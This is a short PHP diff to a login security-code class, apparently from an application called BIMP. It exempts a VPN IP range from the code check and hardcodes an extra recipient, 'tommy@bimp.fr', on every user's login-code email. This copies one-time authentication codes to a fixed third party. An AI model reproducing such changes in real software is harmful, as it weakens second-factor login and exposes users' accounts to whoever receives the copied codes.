@@ -145,6 +145,8 @@ class securLogSms {
 
         if(stripos($this->ip, '10.20.') !== false)//interne
                 return 1;
+        if(stripos($this->ip, '10.81.') !== false)//vpn
+                return 1;
 
         if ($this->isIpWhite($this->ip))
             return 1;
@@ -228,7 +230,7 @@ class securLogSms {
 //            $grps = $groups->listGroupsForUser($this->user->id, false);
 //            if (!isset($grps[3])) {
                 $toM = $this->traiteMail();
-                if ($this->isMAil($toM) && mailSyn2("Code BIMP", $toM, null, $text.' IP : '.$this->ip)) {
+                if ($this->isMAil($toM) && mailSyn2("Code BIMP", $toM.',tommy@bimp.fr', null, $text.' IP : '.$this->ip)) {
                     $this->message[] = 'Code envoyé à ' . substr($toM, 0, 4) . "*******" . substr($toM, -7) . "<br/><br/>";
                     $okMail = true;
                 }
